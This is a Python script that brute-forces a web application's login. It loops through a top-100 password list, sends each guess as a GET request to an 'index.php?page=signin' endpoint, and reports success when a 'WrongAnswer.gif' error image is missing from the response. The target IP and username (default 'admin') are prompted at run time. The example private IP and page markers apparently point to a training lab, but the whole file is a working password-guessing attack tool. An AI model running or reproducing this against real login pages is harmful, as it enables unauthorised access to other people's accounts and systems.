import requests

def bruteforce_login(url, username):
    with open("./passwords_top_100.txt", "r") as passwords:
        for password in passwords:
            password = password.strip()  # Remove any whitespace or newline characters
            full_url = f"{url}?page=signin&username={username}&password={password}&Login=Login"
            
            try:
                response = requests.get(full_url)
                print(f"Tried password: {password}")
                
                # Check if the login was successful by looking for the absence of WrongAnswer.gif
                if '<img src="images/WrongAnswer.gif" alt="">' not in response.text:
                    print(f"Success! Password found: {password}")
                    return password
                
            except requests.RequestException as e:
                print(f"An error occurred: {e}")
    
    print("Password not found in the list.")
    return None

def main():
    ip_address = input("Enter the IP address to test (e.g., 172.20.10.3): ")
    
    base_url = f"http://{ip_address}/index.php"
    
    username = input("Enter the username to test (default is 'admin'): ") or "admin"

    print(f"Testing passwords for {username} at {base_url}")
    
    result = bruteforce_login(base_url, username)

    if result:
        print(f"The correct password is: {result}")
    else:
        print("Failed to find the correct password.")

if __name__ == "__main__":
    main()